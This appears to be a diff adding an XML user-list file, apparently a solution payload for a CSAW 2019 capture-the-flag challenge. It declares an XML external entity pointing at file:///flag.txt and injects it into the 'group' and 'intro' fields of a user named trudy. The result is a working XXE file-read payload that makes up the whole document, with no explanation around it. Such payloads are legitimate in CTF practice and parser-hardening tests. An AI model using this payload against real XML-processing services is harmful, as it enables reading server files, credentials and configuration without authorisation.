@@ -1,0 +1,59 @@
+<?xml version='1.0' ?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
+<users>
+  <user>
+    <username>alice</username>
+    <password>passwd1</password>
+    <name>Alice</name>
+    <email>alice@fakesite.com</email>
+    <group>CSAW2019</group>
+  </user>
+  <user>
+    <username>bob</username>
+    <password>passwd2</password>
+    <name> Bob</name>
+    <email>bob@fakesite.com</email>
+    <group>CSAW2019</group>
+  </user>
+  <user>
+    <username>trudy</username>
+    <password>passwd3</password>
+    <name>Trudy</name>
+    <email>bob@fakesite.com</email>
+    <group>&xxe;</group>
+    <intro>&xxe;</intro>
+  </user>
+</users>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
